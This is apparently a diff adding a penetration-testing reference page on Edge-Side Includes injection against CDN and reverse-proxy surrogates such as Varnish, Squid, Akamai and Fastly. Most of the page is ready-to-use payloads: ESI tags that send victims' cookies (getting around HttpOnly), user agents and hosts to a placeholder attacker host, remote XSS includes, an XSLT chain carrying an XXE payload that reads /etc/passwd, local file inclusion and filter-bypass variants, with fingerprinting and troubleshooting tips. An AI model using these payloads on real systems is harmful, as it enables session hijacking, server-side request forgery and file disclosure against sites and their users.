@@ -1,0 +1,226 @@
+---
+title: ESI Injection
+description: Edge-Side Includes injection - abusing reverse-proxy and CDN surrogates to fetch arbitrary content, steal cookies, or chain to XSLT.
+mitre: [T1190, T1059]
+d3fend: [D3-MH, D3-ACH]
+impact: [ServerSideEval, SessionTakeover]
+owasp: [A05]
+sidebar:
+  order: 2
+  label: ESI Injection
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Edge Side Includes (ESI) are XML-style tags processed by *upstream* HTTP surrogates (Varnish, Squid, Akamai, Fastly, NodeJS proxies) rather than the application server. When the application reflects user input into a response, and the response then passes through an ESI-aware surrogate, the surrogate parses the attacker-controlled tags and acts on them.
+
+```html
+<!-- Detection -->
+<esi:include src="http://<COLLAB>"/>
+
+<!-- Cookie steal (bypasses HttpOnly because ESI runs at the edge) -->
+<esi:include src="http://<ATTACKER>/?c=$(HTTP_COOKIE)"/>
+
+<!-- Akamai debug - leaks ESI variables in response -->
+<esi:debug/>
+
+<!-- XSLT chain (when surrogate supports XSLT) -->
+<esi:include src="http://<ATTACKER>/payload.xsl" dca="xslt"/>
+```
+
+Success indicator: the ESI tag is consumed by an upstream proxy and replaced by the fetched content; or your callback is hit by a request from the surrogate's IP, not the application server's.
+
+## Why ESI is its own bug class
+
+The trust boundary is unusual: the surrogate trusts the application's responses *as a whole*, including user-controlled portions. There's no way for the surrogate to know which parts of the response came from a template versus user input. An ESI tag in the response gets evaluated regardless of origin.
+
+This means:
+
+- The bug exists in the *surrogate's* parser, but is triggered by the *application's* reflection.
+- Cookies the application marked `HttpOnly` are accessible to ESI because the edge sees them in the request.
+- Mitigation has to be at the surrogate (`<esi:remove>` filtering) or by ensuring no user input ever reaches a response served through an ESI surrogate.
+
+## Detection
+
+### Check headers first
+
+```bash
+curl -I http://<TARGET>/
+# Look for:
+#   Surrogate-Control: content="ESI/1.0"
+#   X-Cache, X-Cache-Hits  (Varnish)
+#   X-Akamai-* (Akamai)
+#   Via: ... varnish
+```
+
+Visible surrogate fingerprints don't guarantee ESI is enabled, but they tell you *which* surrogate to target.
+
+### Blind probe
+
+When headers don't reveal the surrogate, test by injecting:
+
+```html
+<esi:include src="http://<COLLAB>"/>
+```
+
+If your collaborator gets a hit, ESI is processing your input. The User-Agent will tell you which surrogate (`Varnish/x.x.x`, `Akamai`, `Apache-HttpClient/Squid`, etc.).
+
+### Where to inject
+
+Same as any reflection-based bug:
+
+- Search results showing "you searched for X"
+- Profile pages echoing user-set fields
+- Error pages echoing the requested URL or referer
+- 404 pages including the requested path
+- Email-template previews
+- API responses that include user-controlled fields rendered into HTML
+
+## Surrogate capability matrix
+
+Adapted from [GoSecure's ESI research](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/):
+
+| Surrogate | `<esi:include>` | `<esi:vars>` | Cookie access | Upstream headers required | Host allowlist |
+| --- | --- | --- | --- | --- | --- |
+| Squid 3 | ✓ | ✓ | ✓ | Yes | No |
+| Varnish | ✓ | - | - | Yes | Yes |
+| Fastly | ✓ | - | - | No | Yes |
+| Akamai ETS | ✓ | ✓ | ✓ | No | No |
+| NodeJS `esi` | ✓ | ✓ | ✓ | No | No |
+| NodeJS `nodesi` | ✓ | - | - | No | Optional |
+
+Capabilities decide what attack works:
+
+- **Includes** - required for SSRF/exfil
+- **Vars** - required to access `$(HTTP_COOKIE)` etc. for cookie/header theft
+- **Cookies** - whether ESI sees the request's cookies
+- **Upstream headers required** - surrogate only processes ESI when application sends `Surrogate-Control: content="ESI/1.0"` (Varnish/Squid). If it doesn't, ESI is dormant.
+- **Host allowlist** - only configured hosts can be `src=` targets; restricts SSRF to whatever's whitelisted.
+
+## Attack patterns
+
+### SSRF / OOB confirmation
+
+```html
+<esi:include src="http://<COLLAB>"/>
+```
+
+The simplest attack. The surrogate fetches your URL - proves the bug exists, identifies the surrogate via User-Agent.
+
+### Cookie theft (HttpOnly bypass)
+
+When the surrogate has cookie access (Squid 3, Akamai ETS, NodeJS `esi`):
+
+```html
+<esi:include src="http://<ATTACKER>/?c=$(HTTP_COOKIE)"/>
+```
+
+`$(HTTP_COOKIE)` is an ESI variable populated from the request's cookies. The surrogate substitutes it before fetching `src=`, so the cookie ends up in your access log.
+
+This bypasses `HttpOnly` because the JavaScript-execution model doesn't apply to surrogates - they're not browsers, just proxies that read cookies from headers.
+
+### Other useful variables
+
+```html
+<esi:include src="http://<ATTACKER>/?ua=$(HTTP_USER_AGENT)"/>
+<esi:include src="http://<ATTACKER>/?host=$(HTTP_HOST)"/>
+<esi:include src="http://<ATTACKER>/?ref=$(HTTP_REFERER)"/>
+```
+
+The variable syntax is `$(VAR_NAME)` for top-level access, `$(VAR{key})` for indexed access (e.g., specific cookie names).
+
+### Reflected XSS via ESI
+
+When the surrogate fetches HTML and inserts it inline, the response delivered to the browser can contain attacker-controlled JavaScript:
+
+```html
+<esi:include src="http://<ATTACKER>/xss.html"/>
+```
+
+`xss.html` on your server contains the actual XSS payload. The browser receives it, runs it.
+
+This bypasses any *content-injection* filter the application might have, because the malicious content arrives via include, not via the original request.
+
+### XSLT chain (when supported)
+
+Some surrogates support `dca="xslt"` to process the included resource as an XSLT transformation. This unlocks XML External Entity (XXE) attacks against the surrogate:
+
+```html
+<esi:include src="http://<ATTACKER>/payload.xsl" dca="xslt"/>
+```
+
+Where `payload.xsl` contains:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE x [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">&xxe;</xsl:template>
+</xsl:stylesheet>
+```
+
+The XSLT execution happens at the surrogate - file reads come from the surrogate's filesystem (often a different machine than the application).
+
+### Akamai-specific debug
+
+```html
+<esi:debug/>
+```
+
+On Akamai, `<esi:debug/>` includes detailed ESI variables in the response - useful for understanding what's available and what's filtered.
+
+### Private file inclusion (not LFI)
+
+When the surrogate has file:// access:
+
+```html
+<esi:include src="supersecret.txt"/>
+<esi:include src="file:///etc/passwd"/>
+```
+
+Less common - most surrogates restrict `src=` to HTTP. But Akamai ETS and NodeJS `esi` historically accepted local paths.
+
+## Filter bypass
+
+When `<esi:` is filtered, alternates:
+
+```html
+<esi:include src="..."/>            # standard
+<ESI:include src="..."/>            # case (some parsers case-insensitive)
+<esi : include src="..."/>          # space tricks
+```
+
+If `<esi:include>` is fully filtered but the surrogate is in path, no obvious bypass - you'd need a different reflection point or a different ESI-supporting tag (`<esi:vars>`, `<esi:try>`).
+
+When the application HTML-escapes `<` to `&lt;`, ESI doesn't trigger. The reflection has to allow raw `<` and `>` for ESI to land.
+
+## Identifying the surrogate
+
+The User-Agent in your callback is the cleanest fingerprint. Common signatures:
+
+```
+User-Agent: Varnish                                                      → Varnish
+User-Agent: Apache-HttpClient (compatible; Squid/3.x.x.x)                → Squid
+User-Agent: Mozilla/5.0 (compatible; AkamaiESI/...)                      → Akamai ETS
+User-Agent: node (esi/x.x.x)                                             → NodeJS esi
+```
+
+Once identified, look up that surrogate's capability row above to know what works.
+
+## Common failure modes
+
+- **`<esi:include>` reflects literally in HTML response.** No ESI surrogate in path, or surrogate doesn't process this content type. Check `Content-Type` - many surrogates only parse `text/html`, so JSON/XML responses are passed through.
+- **OOB callback never arrives.** Surrogate has host allowlist (Varnish, Fastly, sometimes NodeSi). Your `src=` host is blocked. Try whitelisted internal hostnames; SSRF-via-ESI to internal services may still work.
+- **`$(HTTP_COOKIE)` returns empty or literal text.** Surrogate doesn't expose cookies (Varnish, Fastly). Variables-capable surrogates only.
+- **Application sends `Cache-Control: no-store`.** Some surrogates skip ESI processing on uncacheable responses. The ESI tag gets passed to the browser as-is, where it's just a comment.
+- **Ineffective on first request, works on subsequent.** Surrogate caches the response with ESI evaluated; first request might bypass the surrogate (cache miss + processing skipped). Send 2-3 requests, check each.
+- **XSLT chain returns errors.** Surrogate's XSLT processor doesn't support file://, or is sandboxed. Test with HTTP fetch first (`<xsl:include href="http://<COLLAB>/x.xsl"/>`) before assuming XXE works.
+
+## Notes
+
+ESI Injection is rarer than its profile suggests - most modern stacks don't use ESI surrogates, and where they do (large CDNs, e-commerce platforms with edge caching), the surrogate is usually configured restrictively. When it works, the cookie-theft variant is uniquely dangerous because of the HttpOnly bypass - defenders rely on HttpOnly to make stolen-cookie risk acceptable, and ESI breaks that assumption silently.
+
+Cross-link with [SSRF](/codex/web/server-side/ssrf/) when the ESI primitive is being used for SSRF rather than cookie theft - the techniques there (filter bypass, internal discovery) apply identically once you have the include primitive.
